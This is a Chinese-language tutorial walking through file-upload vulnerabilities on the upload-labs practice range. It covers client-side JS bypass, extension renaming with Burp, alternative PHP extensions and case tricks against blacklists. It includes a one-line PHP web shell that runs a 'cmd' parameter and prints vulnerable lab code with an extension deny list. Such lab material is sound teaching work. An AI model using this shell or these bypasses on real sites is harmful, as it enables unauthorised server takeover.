---
slug: /net-security/08/01
---

## 概念

文件上传是常用功能，但恶意文件的上传会形成漏洞。

主要形成是：后端接受了恶意文件上传并保存，受害者访问该恶意文件时，其中的恶意代码被 Web 容器执行。

<br />

常见场景：

1. 上传头像

2. 上传相册

3. 上传附件

4. 添加文章图片

5. 前台留言资料上传

6. 编辑器文件上传

7. ###### ……

<br />

安装靶场

```bash
docker pull cuer/upload-labs
docker run -d -p 8082:80 --name upload-labs cuer/upload-labs
```



## 客户端 - JS 绕过

### 禁用 JavaScript

打开靶场的 Pass-01，点击右上角「查看源码」，这里的文件上传存在 JS 限制，并且只允许 `.jpg`, `.png`, `.gif`

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

在上传前先禁用掉 JavaScript

![](http://img.wukaipeng.com/2023/1017-075949-image-20231017075948931.png)

首先我们上传文件 `info.php`，内容是输出 php 信息：

```php
<?php phpinfo(); ?>
```

![](http://img.wukaipeng.com/2023/10/19-070309-image-20231019070309633.png)我们也可以上传 `get.php`，直接用参数控制输出

```php
<?php eval(@$_GET['cmd']); ?>
```

![](http://img.wukaipeng.com/2023/10/19-071303-image-20231019071303290.png)

### 修改后缀名

先把 `get.php` 修改为符合上传要求 👉 `get.png`，然后用 Burp 抓包改回原来的 `get.php`

![](http://img.wukaipeng.com/2023/10/19-071741-image-20231019071740872.png)



### 修改前端代码

删除 `onsubmit` 方法，这种方式仅在 FireFox 生效：

![](http://img.wukaipeng.com/2023/10/19-072230-image-20231019072230409.png)

## 服务端 - 黑名单绕过

### 特殊后缀

使用 Pass-03，这里后端无法上传的黑名单包括 `.asp`, `.aspx`, `.php`, `.jsp`。



```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

可以使用其他后缀，比如：`.phtml`, `.phps`, `php5`, `.pht`

> 这些后缀文件需要被执行的话有前提条件是， Apache 需要做一些配置代码

### 大小写绕过

使用 Pass-06，上传 `get.PHP` 就能绕过

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```































